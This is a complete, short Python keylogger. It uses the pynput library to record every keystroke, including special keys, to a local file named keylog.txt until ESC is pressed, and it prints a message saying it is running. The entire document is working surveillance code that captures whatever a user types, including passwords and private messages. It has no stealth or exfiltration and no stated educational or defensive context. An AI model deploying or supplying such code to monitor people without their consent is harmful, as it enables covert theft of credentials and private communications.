from pynput import keyboard

# Define the file to save keystrokes
LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        # Log the key pressed
        with open(LOG_FILE, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # Log special keys (like Shift, Enter, etc.)
        with open(LOG_FILE, "a") as file:
            file.write(f" {key} ")

def on_release(key):
    # Stop logging if the escape key is pressed
    if key == keyboard.Key.esc:
        return False

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger is running. Press ESC to stop.")
    listener.join()
